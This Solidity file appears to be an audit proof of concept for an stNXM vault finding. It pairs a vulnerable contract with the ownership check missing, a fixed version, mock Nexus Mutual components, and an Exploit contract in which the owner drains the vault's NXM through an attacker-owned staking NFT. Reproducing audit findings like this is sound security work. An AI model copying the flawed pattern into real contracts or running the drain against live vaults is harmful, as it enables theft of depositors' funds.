// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of stNXM (by EaseDeFi) finding 64080:
// "H-2: The vault can be drained".
//
// `stakeNxm()` is an onlyOwner entry point that calls the internal `_stakeNxm()`.
// `_stakeNxm()` unwraps the vault's wNXM into NXM, approves the Nexus token
// controller, and calls `IStakingPool.depositTo(amount, tranche, requestTokenId,
// address(this))`. Nexus' `depositTo` only requires that msg.sender (the vault)
// is owner-or-approved for `requestTokenId` — NOT that the vault OWNS it. It then
// credits the staked NXM to whoever OWNS `requestTokenId`.
//
// The vault never validates `stakingNFT.ownerOf(tokenId) == address(this)` after
// the deposit. So the (untrusted-per-README) owner can keep a staking NFT they
// own, `approve()` the vault for it, and call `stakeNxm(amount, tranche, theirTokenId)`.
// The vault's NXM is deposited into the owner's own staking position; the owner
// later `withdraw`s it and walks away with `amount` NXM that belonged to the vault.
//
// The audit README explicitly states: "Owner (NOT proxy owner) should generally
// not be able to do anything that would allow them to steal from the vault." —
// so this direct drain by the owner is a valid High.
//
// The fix (commit beea701, applied verbatim in StNXMFixed below) adds exactly:
//   require(stakingNFT.ownerOf(tokenId) == address(this), "Token is not owned by stNXM vault.");
// right after the depositTo call — which reverts the attack (negative control).
//
// Source: https://github.com/EaseDeFi/stNXM-Contracts  contracts/core/stNXM.sol
//         vulnerable commit 86decc1d (parent of fix beea701). `_stakeNxm` is
//         inlined VERBATIM; only the opaque external boundary (NXM / wNXM / Nexus
//         token-controller / staking pool / staking NFT) is represented by minimal
//         faithful doubles. The `// @>` line is the verbatim defective line.
// ─────────────────────────────────────────────────────────────────────────────

// ── Interfaces used by the verbatim vulnerable code (names preserved) ────────
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IWNXM {
    function wrap(uint256 _amount) external;
    function unwrap(uint256 _amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address user) external view returns (uint256);
}

interface INxmMaster {
    function getLatestAddress(bytes2 _contractName) external view returns (address payable contractAddress);
}

interface IStakingPool {
    function depositTo(uint256 amount, uint256 trancheId, uint256 requestTokenId, address destination)
        external
        returns (uint256 tokenId);
    function withdraw(uint256 tokenId) external returns (uint256 withdrawn);
}

interface IStakingNFT {
    function ownerOf(uint256 id) external view returns (address owner);
    function getApproved(uint256) external view returns (address);
    function isApprovedOrOwner(address spender, uint256 id) external view returns (bool);
    function approve(address spender, uint256 id) external;
}

// ── Minimal faithful double: NXM ERC20 ───────────────────────────────────────
contract NxmToken is IERC20 {
    string public name = "Nexus Mutual";
    string public symbol = "NXM";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ── Minimal faithful double: wNXM (the ERC4626 asset). Wraps/unwraps NXM 1:1. ─
contract WNxm is IWNXM {
    IERC20 public immutable nxm;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(IERC20 _nxm) {
        nxm = _nxm;
    }

    /// @dev Harness seed: give `to` wNXM backed by freshly-minted NXM held here.
    function mintTo(address to, uint256 amount) external {
        NxmToken(address(nxm)).mint(address(this), amount); // NXM backing held by wNXM
        balanceOf[to] += amount;
    }

    function wrap(uint256 amount) external {
        nxm.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }

    function unwrap(uint256 amount) external {
        balanceOf[msg.sender] -= amount;      // burn caller's wNXM
        nxm.transfer(msg.sender, amount);     // release NXM backing to caller
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ── Minimal faithful double: Nexus token controller. Pulls NXM via allowance. ─
contract TokenController {
    IERC20 public immutable nxm;

    constructor(IERC20 _nxm) {
        nxm = _nxm;
    }

    /// @dev Pulls `amount` NXM from `from` using the allowance `from` granted to
    ///      this controller (exactly what `nxm.approve(TC, amount)` in _stakeNxm sets).
    function pullFrom(address from, uint256 amount) external {
        nxm.transferFrom(from, address(this), amount);
    }

    /// @dev Releases withdrawn stake back to the staking-NFT owner.
    function payTo(address to, uint256 amount) external {
        nxm.transfer(to, amount);
    }
}

// ── Minimal faithful double: Nexus master registry (getLatestAddress). ───────
contract NxmMaster is INxmMaster {
    address payable public tc;

    constructor(address payable _tc) {
        tc = _tc;
    }

    function getLatestAddress(bytes2) external view returns (address payable) {
        return tc; // "TC" -> token controller
    }
}

// ── Minimal faithful double: Nexus staking NFT (ownership + approvals). ───────
contract StakingNFT is IStakingNFT {
    mapping(uint256 => address) internal _owner;
    mapping(uint256 => address) internal _approved;

    /// @dev Harness seed: mint token `id` to `to` (the attacker keeps ownership).
    function mintTo(address to, uint256 id) external {
        _owner[id] = to;
    }

    /// @dev Harness seed: `owner` approves `spender` for `id`
    ///      (models the attacker's `stakingNFT.approve(vault, id)` tx).
    function approveFrom(address owner, address spender, uint256 id) external {
        require(_owner[id] == owner, "not owner");
        _approved[id] = spender;
    }

    function ownerOf(uint256 id) external view returns (address) {
        return _owner[id];
    }

    function getApproved(uint256 id) external view returns (address) {
        return _approved[id];
    }

    function isApprovedOrOwner(address spender, uint256 id) external view returns (bool) {
        return spender == _owner[id] || _approved[id] == spender;
    }

    function approve(address spender, uint256 id) external {
        require(_owner[id] == msg.sender, "not owner");
        _approved[id] = spender;
    }
}

// ── Minimal faithful double: Nexus StakingPool.depositTo / withdraw. ──────────
// depositTo pulls `amount` NXM from msg.sender (the vault) via the token
// controller and credits the stake to `requestTokenId` (deposit-into-existing-
// token semantics: it returns the SAME requestTokenId). It only checks that
// msg.sender is owner-or-approved for the token — never that it belongs to the
// caller. withdraw pays the stake to whoever OWNS the token.
contract StakingPool is IStakingPool {
    IERC20 public immutable nxm;
    TokenController public immutable tc;
    StakingNFT public immutable nft;
    mapping(uint256 => uint256) public stakeOf;

    constructor(IERC20 _nxm, TokenController _tc, StakingNFT _nft) {
        nxm = _nxm;
        tc = _tc;
        nft = _nft;
    }

    function depositTo(uint256 amount, uint256, /*trancheId*/ uint256 requestTokenId, address /*destination*/ )
        external
        returns (uint256 tokenId)
    {
        // Nexus only requires the caller be owner-or-approved for the token.
        require(nft.isApprovedOrOwner(msg.sender, requestTokenId), "not owner or approved");
        // Pull NXM from the caller (the vault) via its token-controller allowance.
        tc.pullFrom(msg.sender, amount);
        // Credit the stake to the token (whose OWNER may be the attacker).
        stakeOf[requestTokenId] += amount;
        return requestTokenId; // deposit into existing token -> same id
    }

    function withdraw(uint256 tokenId) external returns (uint256 withdrawn) {
        withdrawn = stakeOf[tokenId];
        stakeOf[tokenId] = 0;
        // Withdrawn stake goes to the token OWNER.
        tc.payTo(nft.ownerOf(tokenId), withdrawn);
    }
}

// ── Verbatim Ownable from the audited source (contracts/general/Ownable.sol). ─
contract Ownable {
    address private _owner;
    address private _pendingOwner;

    function initializeOwnable() internal {
        require(_owner == address(0), "already initialized");
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner(), "only owner");
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. `stakeNxm` (onlyOwner entry) and `_stakeNxm` (the buggy
// internal) are inlined VERBATIM from stNXM.sol@86decc1d. The mainnet-constant
// external addresses are replaced by constructor-set doubles keeping the SAME
// member names so `_stakeNxm` is byte-identical. The orthogonal `update` accounting
// modifier is dropped (not on the exploit path); the `onlyOwner` guard is kept.
// ─────────────────────────────────────────────────────────────────────────────
contract StNXM is Ownable {
    // Boundary doubles bound to the real member names used by _stakeNxm.
    IWNXM public wNxm;
    IERC20 public nxm;
    INxmMaster public nxmMaster;
    IStakingNFT public stakingNFT;

    uint256[] public tokenIds;
    mapping(uint256 => address) public tokenIdToPool;
    mapping(uint256 => uint256[]) public tokenIdToTranches;

    constructor(
        IWNXM _wNxm,
        IERC20 _nxm,
        INxmMaster _nxmMaster,
        IStakingNFT _stakingNFT,
        uint256 _seedTokenId,
        address _seedPool
    ) {
        initializeOwnable(); // owner = deployer (the malicious admin)
        wNxm = _wNxm;
        nxm = _nxm;
        nxmMaster = _nxmMaster;
        stakingNFT = _stakingNFT;
        // Pool routing for the 3-arg stakeNxm is hardcoded (no public setter);
        // seed it exactly as the constructor would in production.
        tokenIdToPool[_seedTokenId] = _seedPool;
    }

    // ---- VERBATIM stakeNxm entry (stNXM.sol@86decc1d L354-360; `update` dropped) ----
    function stakeNxm(uint256 _amount, uint256 _trancheId, uint256 _requestTokenId) external onlyOwner {
        _stakeNxm(_amount, tokenIdToPool[_requestTokenId], _trancheId, _requestTokenId);
    }

    // ---- VERBATIM _stakeNxm (stNXM.sol@86decc1d L600-622) ----
    function _stakeNxm(uint256 _amount, address _poolAddress, uint256 _trancheId, uint256 _requestTokenId) internal {
        wNxm.unwrap(_amount);
        // Make sure it's the most recent token controller address.
        nxm.approve(nxmMaster.getLatestAddress("TC"), _amount);

        IStakingPool pool = IStakingPool(_poolAddress);
        uint256 tokenId = pool.depositTo(_amount, _trancheId, _requestTokenId, address(this)); // @> no `require(stakingNFT.ownerOf(tokenId)==address(this))`: stake is credited to the attacker-owned requestTokenId, draining the vault

        // if new nft token is minted we need to keep track of
        // tokenId and poolAddress in order to calculate assets
        // under management
        if (tokenIdToPool[tokenId] == address(0)) {
            tokenIds.push(tokenId);
            tokenIdToPool[tokenId] = _poolAddress;
            tokenIdToTranches[tokenId].push(_trancheId);
        } else {
            // Add tranche ID if it doesn't already exist
            uint256[] memory tranches = tokenIdToTranches[tokenId];
            for (uint256 i = 0; i < tranches.length; i++) {
                if (tranches[i] == _trancheId) return;
            }
            tokenIdToTranches[tokenId].push(_trancheId);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: identical to StNXM, but _stakeNxm adds the exact fix from
// commit beea701 — the ownerOf(tokenId)==address(this) check after depositTo.
// ─────────────────────────────────────────────────────────────────────────────
contract StNXMFixed is Ownable {
    IWNXM public wNxm;
    IERC20 public nxm;
    INxmMaster public nxmMaster;
    IStakingNFT public stakingNFT;

    uint256[] public tokenIds;
    mapping(uint256 => address) public tokenIdToPool;
    mapping(uint256 => uint256[]) public tokenIdToTranches;

    constructor(
        IWNXM _wNxm,
        IERC20 _nxm,
        INxmMaster _nxmMaster,
        IStakingNFT _stakingNFT,
        uint256 _seedTokenId,
        address _seedPool
    ) {
        initializeOwnable();
        wNxm = _wNxm;
        nxm = _nxm;
        nxmMaster = _nxmMaster;
        stakingNFT = _stakingNFT;
        tokenIdToPool[_seedTokenId] = _seedPool;
    }

    function stakeNxm(uint256 _amount, uint256 _trancheId, uint256 _requestTokenId) external onlyOwner {
        _stakeNxm(_amount, tokenIdToPool[_requestTokenId], _trancheId, _requestTokenId);
    }

    function _stakeNxm(uint256 _amount, address _poolAddress, uint256 _trancheId, uint256 _requestTokenId) internal {
        wNxm.unwrap(_amount);
        nxm.approve(nxmMaster.getLatestAddress("TC"), _amount);

        IStakingPool pool = IStakingPool(_poolAddress);
        uint256 tokenId = pool.depositTo(_amount, _trancheId, _requestTokenId, address(this));
        // FIX (commit beea701): the vault must own the staking NFT it staked into.
        require(stakingNFT.ownerOf(tokenId) == address(this), "Token is not owned by stNXM vault.");

        if (tokenIdToPool[tokenId] == address(0)) {
            tokenIds.push(tokenId);
            tokenIdToPool[tokenId] = _poolAddress;
            tokenIdToTranches[tokenId].push(_trancheId);
        } else {
            uint256[] memory tranches = tokenIdToTranches[tokenId];
            for (uint256 i = 0; i < tranches.length; i++) {
                if (tranches[i] == _trancheId) return;
            }
            tokenIdToTranches[tokenId].push(_trancheId);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the (untrusted) vault owner stakes the vault's NXM into a
// staking NFT the owner keeps, then withdraws it — draining the vault.
// The stolen NXM is delivered to the attacker EOA (the NFT owner).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 public constant ATTACKER_TOKEN_ID = 105; // the NFT the admin keeps
    uint256 public constant TRANCHE = 8;
    uint256 public constant AMOUNT = 1000 ether; // vault assets drained

    // Exposed handles/results for the driver + Playground.
    address public nxmAddr;
    address public wNxmAddr;
    address public vaultAddr;
    address public poolAddr;
    uint256 public vaultWNxmBefore;
    uint256 public vaultNxmAfter;
    uint256 public attackerNxmBefore;
    uint256 public attackerNxmAfter;
    uint256 public stolen;

    function run() external payable {
        // --- deploy the opaque external boundary as minimal faithful doubles ---
        NxmToken nxm = new NxmToken(); // 0
        TokenController tc = new TokenController(nxm); // 1
        WNxm wNxm = new WNxm(nxm); // 2
        NxmMaster master = new NxmMaster(payable(address(tc))); // 3
        StakingNFT nft = new StakingNFT(); // 4
        StakingPool pool = new StakingPool(nxm, tc, nft); // 5

        // --- deploy the VULNERABLE vault; owner() == this Exploit (the admin) ---
        StNXM vault = new StNXM(
            IWNXM(address(wNxm)),
            IERC20(address(nxm)),
            INxmMaster(address(master)),
            IStakingNFT(address(nft)),
            ATTACKER_TOKEN_ID,
            address(pool)
        ); // 6

        nxmAddr = address(nxm);
        wNxmAddr = address(wNxm);
        vaultAddr = address(vault);
        poolAddr = address(pool);

        // --- attacker keeps a staking NFT and approves the vault for it ---
        nft.mintTo(ATTACKER, ATTACKER_TOKEN_ID);
        nft.approveFrom(ATTACKER, address(vault), ATTACKER_TOKEN_ID);

        // --- fund the vault with wNXM (its ERC4626 asset), backed by NXM ---
        wNxm.mintTo(address(vault), AMOUNT);

        vaultWNxmBefore = wNxm.balanceOf(address(vault));
        attackerNxmBefore = nxm.balanceOf(ATTACKER);

        // --- ADMIN drains: stake the vault's NXM into the attacker-owned token ---
        vault.stakeNxm(AMOUNT, TRANCHE, ATTACKER_TOKEN_ID);

        // --- attacker withdraws the stake funded entirely by the vault ---
        pool.withdraw(ATTACKER_TOKEN_ID);

        vaultNxmAfter = nxm.balanceOf(address(vault));
        attackerNxmAfter = nxm.balanceOf(ATTACKER);
        stolen = attackerNxmAfter - attackerNxmBefore;

        // --- HARM: vault fully drained; the attacker EOA gained the vault's NXM ---
        require(wNxm.balanceOf(address(vault)) == 0, "vault wNXM not drained");
        require(vaultNxmAfter == 0, "vault still holds NXM");
        require(stolen == AMOUNT, "attacker did not receive the drained amount");
    }
}
